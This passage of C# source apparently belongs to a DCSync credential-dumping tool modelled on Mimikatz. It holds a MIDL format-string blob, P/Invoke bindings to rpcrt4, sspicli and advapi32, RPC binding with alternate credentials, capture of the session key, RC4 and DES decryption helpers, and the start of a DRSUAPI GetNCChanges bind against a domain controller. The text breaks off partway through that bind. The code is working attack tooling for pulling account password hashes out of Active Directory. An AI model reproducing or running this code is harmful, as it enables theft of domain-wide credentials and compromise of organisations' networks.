            0x5a,0xfd,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x1c,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x1a,0x03,0x28,0x00,0x00,0x00,
            0x10,0x00,0x36,0x08,0x08,0x08,0x08,0x06,0x3e,0x4c,0x00,0xc1,0xff,0x36,0x5c,0x5b,0x12,0x00,0x3e,0xfd,0x12,0x00,0xce,0xff,0x12,0x00,0x8e,0xfc,0x12,0x00,0x18,0x00,
            0xb7,0x08,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x1b,0x00,0x01,0x00,0x09,0x00,0xfc,0xff,0x01,0x00,0x02,0x5b,0x1a,0x03,0x04,0x00,0xf0,0xff,0x00,0x00,0x4c,0x00,
            0xe0,0xff,0x5c,0x5b,0x11,0x14,0xd6,0xff,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,0x30,0x41,0x00,0x00,0x11,0x00,0x02,0x00,
            0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x80,0x00,0x01,0x00,0x08,0x00,0x00,0x00,0x64,0x00,0xff,0xff,0x15,0x07,0x08,0x00,0x0b,0x5b,0xb7,0x08,0x00,0x00,
            0x00,0x00,0x00,0x00,0x10,0x00,0x15,0x07,0x18,0x00,0x4c,0x00,0x1c,0xfc,0x0b,0x5b,0x1b,0x07,0x18,0x00,0x09,0x00,0xf8,0xff,0x01,0x00,0x4c,0x00,0xea,0xff,0x5c,0x5b,
            0x1a,0x07,0x10,0x00,0xec,0xff,0x00,0x00,0x08,0x08,0x4c,0x00,0xd0,0xff,0x08,0x5b,0xb7,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x1b,0x03,0x04,0x00,0x09,0x00,
            0xfc,0xff,0x01,0x00,0x08,0x5b,0x1a,0x03,0x0c,0x00,0xf0,0xff,0x00,0x00,0x08,0x08,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x1a,0x07,0x80,0x00,0x00,0x00,0x20,0x00,0x4c,0x00,
            0xc8,0xfb,0x4c,0x00,0xc4,0xfb,0x36,0x4c,0x00,0xcb,0xfb,0x36,0x08,0x08,0x08,0x08,0x4c,0x00,0x84,0xff,0x36,0x36,0x4c,0x00,0x1e,0xfc,0x5c,0x5b,0x11,0x00,0x52,0xfc,
            0x12,0x00,0x9e,0xff,0x12,0x00,0xc0,0xff,0x12,0x00,0xbc,0xff,0x11,0x0c,0x08,0x5c,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x02,0x00,0xa8,0x00,
            0x01,0x00,0x06,0x00,0x00,0x00,0xaa,0xfd,0xff,0xff,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x28,0x00,0x01,0x00,0x01,0x00,0x00,0x00,
            0x04,0x00,0xff,0xff,0x1a,0x03,0x28,0x00,0x00,0x00,0x0c,0x00,0x36,0x36,0x4c,0x00,0x58,0xfb,0x08,0x40,0x5c,0x5b,0x11,0x00,0xf8,0xfb,0x11,0x08,0x22,0x5c,0x11,0x00,
            0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x68,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x14,0x00,0xff,0xff,0x1d,0x00,0x54,0x00,0x02,0x5b,0x15,0x00,
            0x54,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1a,0x03,0x68,0x00,0x00,0x00,0x0a,0x00,0x36,0x36,0x4c,0x00,0xea,0xff,0x08,0x5b,0x11,0x00,0xb6,0xfb,0x11,0x08,0x22,0x5c,
            0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x18,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0xff,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,
            0x08,0x00,0x36,0x36,0x08,0x40,0x5c,0x5b,0x11,0x00,0x86,0xfb,0x12,0x08,0x22,0x5c,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x30,0x00,
            0x01,0x00,0x01,0x00,0x00,0x00,0x24,0x00,0xff,0xff,0xb7,0x08,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x21,0x03,0x00,0x00,0x19,0x00,0x04,0x00,0x01,0x00,0xff,0xff,
            0xff,0xff,0x00,0x00,0x12,0x00,0x4a,0xfb,0x5c,0x5b,0x1a,0x03,0x30,0x00,0x00,0x00,0x12,0x00,0x08,0x4c,0x00,0xd5,0xff,0x36,0x4c,0x00,0x00,0xfc,0x4c,0x00,0xf8,0xfa,
            0x5c,0x5b,0x12,0x00,0xd0,0xff,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x02,0x00,0x20,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x24,0x00,0xff,0xff,
            0xb7,0x08,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x21,0x03,0x00,0x00,0x19,0x00,0x04,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xd2,0xfb,0x5c,0x5b,
            0x1a,0x03,0x20,0x00,0x00,0x00,0x0e,0x00,0x08,0x4c,0x00,0xd5,0xff,0x36,0x4c,0x00,0xa6,0xfa,0x5c,0x5b,0x12,0x00,0xd4,0xff,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,
            0x08,0x00,0x01,0x00,0x02,0x00,0x20,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x24,0x00,0xff,0xff,0xb7,0x08,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x21,0x03,0x00,0x00,
            0x19,0x00,0x14,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x12,0x08,0x25,0x5c,0x5c,0x5b,0x1a,0x03,0x20,0x00,0x00,0x00,0x0e,0x00,0x08,0x08,0x08,0x08,0x08,0x4c,
            0x00,0xd1,0xff,0x36,0x5c,0x5b,0x12,0x00,0xd4,0xff,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x02,0x00,0x08,0x00,0x01,0x00,0x01,0x00,0x00,0x00,
            0x6a,0xfc,0xff,0xff,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x10,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x04,0x00,0xff,0xff,0x1a,0x03,
            0x10,0x00,0x00,0x00,0x06,0x00,0x36,0x08,0x40,0x5b,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x02,0x00,0x10,0x00,0x01,0x00,
            0x02,0x00,0x00,0x00,0x94,0xfc,0xff,0xff,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,0x08,0x00,0x01,0x00,0x02,0x00,0x28,0x00,0x01,0x00,0x02,0x00,0x00,0x00,0x16,0x00,
            0xff,0xff,0x1a,0x03,0x28,0x00,0x00,0x00,0x08,0x00,0x36,0x4c,0x00,0xe1,0xfa,0x5b,0x12,0x00,0xf0,0xff,0x1a,0x03,0x28,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xe4,0xff,
            0x5c,0x5b,0x11,0x04,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x02,0x00,0x28,0x00,0x01,0x00,0x02,0x00,0x00,0x00,0x82,0xfc,0xff,0xff,0x00
        };
        #endregion

        #region P/Invoke
        [DllImport("rpcrt4.dll", CharSet = CharSet.Unicode)]
        static extern int RpcStringBindingComposeW(string ObjUuid, string ProtSeq, string NetworkAddr, string Endpoint, string Options, out IntPtr lpBindingString);

        [DllImport("rpcrt4.dll", CharSet = CharSet.Unicode)]
        static extern int RpcBindingFromStringBindingW(string bindingString, out IntPtr lpBinding);

        [DllImport("rpcrt4.dll", CharSet = CharSet.Unicode)]
        static extern int RpcBindingSetAuthInfoExW(IntPtr lpBinding, string ServerPrincName, uint AuthnLevel, uint AuthnSvc, IntPtr identity, uint AuthzSvc, ref RPC_SECURITY_QOS SecurityQOS);

        [DllImport("rpcrt4.dll")]
        static extern int RpcBindingSetOption(IntPtr Binding, uint Option, IntPtr OptionValue);

        [DllImport("rpcrt4.dll")]
        static extern int RpcBindingFree(ref IntPtr lpString);

        [DllImport("rpcrt4.dll")]
        static extern int I_RpcBindingInqSecurityContext(IntPtr Binding, out IntPtr SecurityContextHandle);

        // NdrClientCall2 overloads for each RPC operation
        [DllImport("rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        static extern IntPtr NdrClientCall2_Bind(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT ext_int, ref IntPtr pDrsExtensionsExt, ref IntPtr hDrs);

        [DllImport("rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        static extern IntPtr NdrClientCall2_DCInfo(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_DCINFOREQ_V1 dcInfoReq, ref uint dcOutVersion, ref DRS_MSG_DCINFOREPLY_V2 dcInfoRep);

        [DllImport("rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        static extern IntPtr NdrClientCall2_CrackName(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_CRACKREQ_V1 dcInfoReq, ref uint dcOutVersion, ref IntPtr dcInfoRep);

        [DllImport("rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        static extern IntPtr NdrClientCall2_GetNCChanges(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dwInVersion, DRS_MSG_GETCHGREQ_V8 pmsgIn, ref uint dwOutVersion, ref DRS_MSG_GETCHGREPLY_V6 pmsgOut);

        [DllImport("rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr NdrClientCall2_Unbind(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr hDrs);

        [DllImport("sspicli.dll")]
        static extern int QueryContextAttributesA(IntPtr hContext, uint ulAttribute, ref SecPkgContext_SessionKey pContextAttributes);

        [DllImport("advapi32.dll", EntryPoint = "SystemFunction027", SetLastError = true)]
        static extern int RtlDecryptDES2blocks1DWORD(byte[] data, ref uint key, IntPtr output);

        [DllImport("advapi32.dll", EntryPoint = "SystemFunction032", SetLastError = true)]
        static extern int RtlEncryptDecryptRC4(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);

        [DllImport("advapi32.dll")]
        static extern IntPtr GetSidSubAuthority(IntPtr sid, uint subAuthorityIndex);

        [DllImport("advapi32.dll")]
        static extern IntPtr GetSidSubAuthorityCount(IntPtr psid);

        [DllImport("msasn1.dll")]
        static extern IntPtr ASN1_CreateModule(uint nVersion, uint eRule, uint dwFlags, uint cPDUs, IntPtr[] apfnEncoder, IntPtr[] apfnDecoder, IntPtr[] apfnFreeMemory, int[] acbStructSize, uint nModuleName);

        [DllImport("msasn1.dll")]
        static extern int ASN1_CreateDecoder(IntPtr pModule, out IntPtr ppDecoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent);

        [DllImport("msasn1.dll", CharSet = CharSet.Ansi)]
        static extern bool ASN1BERDotVal2Eoid(IntPtr pEncoderInfo, string dotOID, IntPtr encodedOID);

        [DllImport("msasn1.dll")]
        static extern void ASN1_FreeEncoded(ref ASN1encoding_s pEncoderInfo, IntPtr pBuf);

        [DllImport("msasn1.dll")]
        static extern void ASN1_CloseModule(IntPtr pModule);
        #endregion

        #region State
        static byte[] SessionKey;
        static GCHandle procString;
        static GCHandle formatString;
        static GCHandle stub;
        static GCHandle faultoffsets;
        static GCHandle clientinterface;

        delegate void SecurityCallbackDelegate(IntPtr context);
        static SecurityCallbackDelegate rpcSecurityCallbackDelegate;

        delegate IntPtr AllocMemoryFunctionDelegate(int memsize);
        static AllocMemoryFunctionDelegate allocMemoryFunctionDelegate;

        delegate void FreeMemoryFunctionDelegate(IntPtr memory);
        static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;

        static IntPtr hASN1Module = IntPtr.Zero;
        static ASN1encoding_s ASN1enc;
        static ASN1decoding_s ASN1dec;
        static IntPtr[] kull_m_asn1_encdecfreefntab = { IntPtr.Zero };
        static int[] kull_m_asn1_sizetab = { 0 };
        #endregion

        #region CRC32
        static uint[] dwCrc32Table = new uint[] {
            0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,0x9E6495A3,
            0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,0xE7B82D07,0x90BF1D91,
            0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,0x6DDDE4EB,0xF4D4B551,0x83D385C7,
            0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,
            0x3B6E20C8,0x4C69105E,0xD56041E4,0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,
            0x35B5A8FA,0x42B2986C,0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,
            0x26D930AC,0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,
            0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,0xB6662D3D,
            0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,0x9FBFE4A5,0xE8B8D433,
            0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,0x086D3D2D,0x91646C97,0xE6635C01,
            0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,
            0x65B0D9C6,0x12B7E950,0x8BBEB8EA,0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,
            0x4DB26158,0x3AB551CE,0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,
            0x4369E96A,0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,
            0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,0xCE61E49F,
            0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,0xB7BD5C3B,0xC0BA6CAD,
            0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,0x9DD277AF,0x04DB2615,0x73DC1683,
            0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,
            0xF00F9344,0x8708A3D2,0x1E01F268,0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,
            0xFED41B76,0x89D32BE0,0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,
            0xD6D6A3E8,0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,
            0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,0x4669BE79,
            0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,0x220216B9,0x5505262F,
            0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,
            0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,
            0x95BF4A82,0xE2B87A14,0x7BB12BAE,0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,
            0x86D3D2D4,0xF1D4E242,0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,
            0x88085AE6,0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,
            0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,0x3E6E77DB,
            0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,0x47B2CF7F,0x30B5FFE9,
            0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,0xCDD70693,0x54DE5729,0x23D967BF,
            0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D
        };

        static uint CalcCrc32(byte[] data)
        {
            uint dwCRC = 0xFFFFFFFF;
            for (int i = 0; i < data.Length; i++)
                dwCRC = (dwCRC >> 8) ^ dwCrc32Table[(data[i]) ^ (dwCRC & 0x000000FF)];
            return ~dwCRC;
        }
        #endregion

        #region ASN1 Module Init/Term
        static bool Asn1_init()
        {
            hASN1Module = ASN1_CreateModule((((1) << 16) | (0)), 1024, 4096, 1, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_encdecfreefntab, kull_m_asn1_sizetab, 1769433451);
            if (hASN1Module != IntPtr.Zero)
            {
                IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
                Marshal.StructureToPtr(ASN1enc, mt, false);
                int ret = ASN1_CreateDecoder(hASN1Module, out mt, IntPtr.Zero, 0, IntPtr.Zero);
                ASN1enc = (ASN1encoding_s)Marshal.PtrToStructure(mt, typeof(ASN1encoding_s));
                if (ret < 0)
                {
                    ASN1enc = new ASN1encoding_s();
                    return false;
                }

                IntPtr mt2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1decoding_s)));
                Marshal.StructureToPtr(ASN1dec, mt2, false);
                ret = ASN1_CreateDecoder(hASN1Module, out mt2, IntPtr.Zero, 0, IntPtr.Zero);
                ASN1dec = (ASN1decoding_s)Marshal.PtrToStructure(mt2, typeof(ASN1decoding_s));
                if (ret < 0)
                {
                    ASN1dec = new ASN1decoding_s();
                    return false;
                }
                return true;
            }
            return false;
        }

        static void Asn1_term()
        {
            if (hASN1Module != IntPtr.Zero)
            {
                ASN1_CloseModule(hASN1Module);
                hASN1Module = IntPtr.Zero;
            }
        }
        #endregion

        #region OID to ATTID
        static bool DotVal2Eoid(string dotOID, out OssEncodedOID encodedOID)
        {
            encodedOID = new OssEncodedOID();
            encodedOID.length = 0;
            encodedOID.value = IntPtr.Zero;

            if (ASN1enc.Equals(default(ASN1encoding_s)) || string.IsNullOrEmpty(dotOID))
                return false;

            IntPtr mt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ASN1encoding_s)));
            Marshal.StructureToPtr(ASN1enc, mt, false);

            IntPtr ot = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(OssEncodedOID)));
            Marshal.StructureToPtr(encodedOID, ot, false);

            try
            {
                bool status = ASN1BERDotVal2Eoid(mt, dotOID, ot);
                if (status)
                    encodedOID = (OssEncodedOID)Marshal.PtrToStructure(ot, typeof(OssEncodedOID));
                return status;
            }
            finally
            {
                Marshal.FreeHGlobal(mt);
                Marshal.FreeHGlobal(ot);
            }
        }

        static bool CopyMemoryHelper(IntPtr src, IntPtr dest, int length)
        {
            try
            {
                byte[] tmpbyte = new byte[length];
                Marshal.Copy(src, tmpbyte, 0, length);
                Marshal.Copy(tmpbyte, 0, dest, length);
                return true;
            }
            catch { return false; }
        }

        static bool DrsrMakeAttidAddPrefixToTable(ref SCHEMA_PREFIX_TABLE prefixTable, ref OssEncodedOID oidPrefix, ref uint ndx)
        {
            ndx = prefixTable.PrefixCount;
            IntPtr entries = Marshal.AllocHGlobal((int)(Marshal.SizeOf(typeof(PrefixTableEntry)) * (ndx + 1)));
            int size = Marshal.SizeOf(typeof(PrefixTableEntry));

            if (prefixTable.pPrefixEntry != IntPtr.Zero)
            {
                for (int i = 0; i < ndx; i++)
                {
                    PrefixTableEntry entry = (PrefixTableEntry)Marshal.PtrToStructure(IntPtr.Add(prefixTable.pPrefixEntry, i * size), typeof(PrefixTableEntry));
                    Marshal.StructureToPtr(entry, IntPtr.Add(entries, i * size), false);
                }
            }

            PrefixTableEntry newentry = new PrefixTableEntry();
            newentry.ndx = ndx;
            newentry.prefix.length = oidPrefix.length;
            newentry.prefix.elements = Marshal.AllocHGlobal(oidPrefix.length);

            if (CopyMemoryHelper(oidPrefix.value, newentry.prefix.elements, oidPrefix.length))
            {
                Marshal.StructureToPtr(newentry, IntPtr.Add(entries, (int)ndx * size), false);
                prefixTable.pPrefixEntry = entries;
                prefixTable.PrefixCount = prefixTable.PrefixCount + 1;
                return true;
            }
            return false;
        }

        static void DrsrMakeAttid(ref SCHEMA_PREFIX_TABLE prefixTable, string szOid, ref uint att)
        {
            string lastValueString = szOid.Substring(szOid.LastIndexOf(".") + 1);
            uint lastValue = UInt32.Parse(lastValueString);

            att = (ushort)(lastValue % 0x4000);
            if (att >= 0x4000)
                att += 0x8000;

            OssEncodedOID oidPrefix;
            if (DotVal2Eoid(szOid, out oidPrefix))
            {
                oidPrefix.length -= (ushort)((lastValue < 0x80) ? 1 : 2);
                uint ndx = 0;
                if (DrsrMakeAttidAddPrefixToTable(ref prefixTable, ref oidPrefix, ref ndx))
                    att = (ushort)(att | ndx << 16);
            }
        }
        #endregion

        #region MIDL Stub Setup
        static IntPtr GetStubPtr(ushort MajorVersion, ushort MinorVersion)
        {
            if (!stub.IsAllocated)
            {
                Guid interfaceID = new Guid("e3514235-4b06-11d1-ab04-00c04fc2dcd2");
                procString = GCHandle.Alloc(ms2Ddrsr__MIDL_ProcFormatString, GCHandleType.Pinned);
                Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

                RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE
                {
                    Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)),
                    InterfaceId = new RPC_SYNTAX_IDENTIFIER { SyntaxGUID = interfaceID, SyntaxVersion = new RPC_VERSION { MajorVersion = MajorVersion, MinorVersion = MinorVersion } },
                    TransferSyntax = new RPC_SYNTAX_IDENTIFIER { SyntaxGUID = IID_SYNTAX, SyntaxVersion = new RPC_VERSION { MajorVersion = 2, MinorVersion = 0 } },
                    DispatchTable = IntPtr.Zero, RpcProtseqEndpointCount = 0u, RpcProtseqEndpoint = IntPtr.Zero,
                    Reserved = IntPtr.Zero, InterpreterInfo = IntPtr.Zero, Flags = 0u
                };

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS { CommOffset = -1, FaultOffset = -1 };

                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(ms2Ddrsr__MIDL_TypeFormatString, GCHandleType.Pinned);

                allocMemoryFunctionDelegate = AllocateMemory;
                freeMemoryFunctionDelegate = FreeMemory;

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC
                {
                    pFormatTypes = formatString.AddrOfPinnedObject(),
                    RpcInterfaceInformation = clientinterface.AddrOfPinnedObject(),
                    CommFaultOffsets = IntPtr.Zero,
                    pfnAllocate = Marshal.GetFunctionPointerForDelegate(allocMemoryFunctionDelegate),
                    pfnFree = Marshal.GetFunctionPointerForDelegate(freeMemoryFunctionDelegate),
                    pAutoBindHandle = IntPtr.Zero, apfnNdrRundownRoutines = IntPtr.Zero,
                    aGenericBindingRoutinePairs = IntPtr.Zero, apfnExprEval = IntPtr.Zero,
                    aXmitQuintuple = IntPtr.Zero, fCheckBounds = 1, Version = 0x50002u,
                    pMallocFreeStruct = IntPtr.Zero, MIDLVersion = 0x8000253,
                    aUserMarshalQuadruple = IntPtr.Zero, NotifyRoutineTable = IntPtr.Zero,
                    mFlags = new IntPtr(0x00000001), CsRoutineTables = IntPtr.Zero,
                    ProxyServerInfo = IntPtr.Zero, pExprInfo = IntPtr.Zero,
                };

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }
            return stub.AddrOfPinnedObject();
        }

        static IntPtr GetProcStringPtr(int index)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(ms2Ddrsr__MIDL_ProcFormatString, index);
        }

        static IntPtr AllocateMemory(int size)
        {
            return Marshal.AllocHGlobal(size);
        }

        static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        static CRYPTO_BUFFER GetCryptoBuffer(byte[] bytes)
        {
            CRYPTO_BUFFER cpb = new CRYPTO_BUFFER();
            cpb.Length = cpb.MaximumLength = (uint)bytes.Length;
            cpb.Buffer = Marshal.AllocHGlobal(bytes.Length);
            Marshal.Copy(bytes, 0, cpb.Buffer, bytes.Length);
            return cpb;
        }
        #endregion

        #region RPC Security Callback
        static void RpcSecurityCallback(IntPtr context)
        {
            if (SessionKey == null)
            {
                IntPtr SecurityContextHandle;
                SecPkgContext_SessionKey sessionKey = new SecPkgContext_SessionKey();
                int rpcStatus = I_RpcBindingInqSecurityContext(context, out SecurityContextHandle);
                if (rpcStatus == 0)
                {
                    int secStatus = QueryContextAttributesA(SecurityContextHandle, SECPKG_ATTR_SESSION_KEY, ref sessionKey);
                    if (secStatus == 0)
                    {
                        SessionKey = new byte[sessionKey.SessionKeyLength];
                        Marshal.Copy(sessionKey.SessionKey, SessionKey, 0, (int)sessionKey.SessionKeyLength);
                    }
                }
            }
        }
        #endregion

        #region RPC Binding
        static IntPtr CreateBinding(string dc, string altservice, int rpcAuth, string authuser, string authdomain, string authpassword, bool forcentlm)
        {
            IntPtr pStringBinding;
            IntPtr hBinding = IntPtr.Zero;

            int rpcStatus = RpcStringBindingComposeW(null, "ncacn_ip_tcp", dc, null, null, out pStringBinding);
            if (rpcStatus != 0) return IntPtr.Zero;

            string stringBinding = Marshal.PtrToStringUni(pStringBinding);
            rpcStatus = RpcBindingFromStringBindingW(stringBinding, out hBinding);
            if (rpcStatus != 0) return IntPtr.Zero;

            if (rpcAuth != 0)
            {
                RPC_SECURITY_QOS securityqos = new RPC_SECURITY_QOS();
                securityqos.Version = 1;
                securityqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;

                IntPtr psecAuth = IntPtr.Zero;
                if (!string.IsNullOrEmpty(authuser))
                {
                    SEC_WINNT_AUTH_IDENTITY_W secAuth = new SEC_WINNT_AUTH_IDENTITY_W
                    {
                        User = authuser,
                        Domain = authdomain ?? "",
                        Password = authpassword ?? "",
                        UserLength = authuser.Length,
                        DomainLength = (authdomain ?? "").Length,
                        PasswordLength = (authpassword ?? "").Length,
                        Flags = 2
                    };
                    psecAuth = Marshal.AllocHGlobal(Marshal.SizeOf(secAuth));
                    Marshal.StructureToPtr(secAuth, psecAuth, false);
                }

                rpcStatus = RpcBindingSetAuthInfoExW(hBinding, altservice + "/" + dc, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, (uint)rpcAuth, psecAuth, 0, ref securityqos);
                if (rpcStatus != 0)
                {
                    RpcBindingFree(ref hBinding);
                    return IntPtr.Zero;
                }

                rpcSecurityCallbackDelegate = RpcSecurityCallback;
                rpcStatus = RpcBindingSetOption(hBinding, RPC_C_OPT_SECURITY_CALLBACK, Marshal.GetFunctionPointerForDelegate(rpcSecurityCallbackDelegate));
                if (rpcStatus != 0)
                {
                    RpcBindingFree(ref hBinding);
                    return IntPtr.Zero;
                }
            }
            return hBinding;
        }
        #endregion

        #region DRS Operations
        static int DrsrGetDCBind(IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT extensions_in, out DRS_EXTENSIONS_INT extensions_out, out IntPtr hDrs)
        {
            IntPtr pDrsExtensionsExt = IntPtr.Zero;
            hDrs = IntPtr.Zero;
            extensions_out = extensions_in;

            try
            {
                IntPtr result = NdrClientCall2_Bind(GetStubPtr(4, 0), GetProcStringPtr(0), hBinding, NtdsDsaObjectGuid, extensions_in, ref pDrsExtensionsExt, ref hDrs);

                if (pDrsExtensionsExt != IntPtr.Zero)
                {
                    DRS_EXTENSIONS_INT ext_out = (DRS_EXTENSIONS_INT)Marshal.PtrToStructure(pDrsExtensionsExt, typeof(DRS_EXTENSIONS_INT));
                    if (ext_out.cb > Marshal.OffsetOf(typeof(DRS_EXTENSIONS_INT), "SiteObjGuid").ToInt32())
                        extensions_out.SiteObjGuid = ext_out.SiteObjGuid;
